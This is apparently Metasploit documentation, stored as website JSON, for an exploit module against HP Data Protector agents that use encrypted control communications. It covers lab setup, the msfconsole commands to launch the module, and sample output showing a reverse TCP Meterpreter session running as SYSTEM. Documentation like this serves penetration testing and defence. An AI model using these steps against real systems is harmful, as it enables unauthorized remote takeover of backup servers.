{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/misc/hp_dataprotector_encrypted_comms","result":{"data":{"moduleMetadataJson":{"id":"e183f0b3-7fac-57ba-b1b3-ac36c9a5328f","name":"HP Data Protector Encrypted Communication Remote Command Execution","fullname":"exploit/windows/misc/hp_dataprotector_encrypted_comms","description":"This module exploits a well known remote code execution exploit after establishing encrypted\n        control communications with a Data Protector agent. This allows exploitation of Data\n        Protector agents that have been configured to only use encrypted control communications.\n\n        This exploit works by executing the payload with Microsoft PowerShell so will only work\n        against Windows Vista or newer. Tested against Data Protector 9.0 installed on Windows\n        Server 2008 R2.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/misc/hp_dataprotector_encrypted_comms","documentationSlug":"/modules/documentation/exploit/windows/misc/hp_dataprotector_encrypted_comms","referencesSlug":"/modules/references/exploit/windows/misc/hp_dataprotector_encrypted_comms"},"documentation":{"html":"<p>HP Data Protector is an automated backup and recovery software for single-server to enterprise\nenvironments. It provides cross-platform, online backup of data for Microsoft Windows, Unix,\nand Linux operating systems.</p>\n<p>While the server is using Encrypted Control Communication, HP Data Protector allows a remote\nattacker to gain access without authentication, and gain arbitrary code execution under the\ncontext of SYSTEM.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>HP Data Protector versions 7, 8, and 9 are known to be affected.</p>\n<p>This module was tested against version 9.0.0 on Windows 2008.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p><strong>Installing HP Data Protector</strong></p>\n<p>Before installing HP Data Protector, a Windows domain controller is needed. This exploit was tested\nagainst <a href=\"https://www.youtube.com/watch?v=Buj9oEgbRt8\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">a Windows Server 2008 R2 SP1 domain controller</a>.</p>\n<p>After setting up the domain controller, double-click on the HP Data Protector installer, and you\nshould see this screen:</p>\n<p><img src=\"https://cloud.githubusercontent.com/assets/13082457/15794665/99a86238-29e4-11e6-8ccd-0e09b0c8a693.png\" alt=\"screen_1\"></p>\n<p>Click on <strong>Install Data Protector</strong>. And then the installer should ask you which installation type:</p>\n<p><img src=\"https://cloud.githubusercontent.com/assets/13082457/15794701/de31d07e-29e4-11e6-9410-0b88abe77afe.png\" alt=\"screen_2\"></p>\n<p>Make sure to select <strong>Cell Manager</strong>, and click <strong>Next</strong>. Use all default settings.</p>\n<p><strong>Enabling Encrypted Communication</strong></p>\n<p>After the Setup Wizard is finished, we need to enable encrypted communication. First, open the\nData Protector GUI:</p>\n<p><img src=\"https://cloud.githubusercontent.com/assets/1170914/15845344/d3a84ee4-2c37-11e6-821d-fe8002c94686.png\" alt=\"screen_3\"></p>\n<p>Click on <strong>Clients</strong>, and the local client from the tree. You should see the <strong>Connection</strong> tab on the\nright, click on that.</p>\n<p><img src=\"https://cloud.githubusercontent.com/assets/1170914/15845351/df9929f8-2c37-11e6-9d82-8c519c030a5f.png\" alt=\"screen_4\"></p>\n<p>Under the Connection tab, there should be an <strong>Encrypted control communication</strong> checkbox, make\nsure that is checked. And then click <strong>Apply</strong></p>\n<p><strong>Using hp<em>dataprotector</em>encrypted_comms</strong></p>\n<p>After the encrypted communication is enabled, you are ready to use\nhp<em>dataprotector</em>encrypted_comms. Here is what you do:</p>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/misc/hp_dataprotector_encrypted_comms</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [IP ADDRESS]</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD [PAYLOAD NAME]</code></li>\n<li>Set other options as needed</li>\n<li>Do: <code class=\"language-text\">exploit</code>, and you should receive a session like the following:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(hp_dataprotector_encrypted_comms) &gt; run\n\n[*] Started reverse TCP handler on 172.16.23.1:4444 \n[*] 172.16.23.173:5555 - Initiating connection\n[*] 172.16.23.173:5555 - Establishing encrypted channel\n[*] 172.16.23.173:5555 - Sending payload\n[*] 172.16.23.173:5555 - Waiting for payload execution (this can take up to 30 seconds or so)\n[*] Sending stage (957999 bytes) to 172.16.23.173\n[*] Meterpreter session 1 opened (172.16.23.1:4444 -&gt; 172.16.23.173:49304) at 2016-06-06 22:16:54 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e183f0b3-7fac-57ba-b1b3-ac36c9a5328f"}}}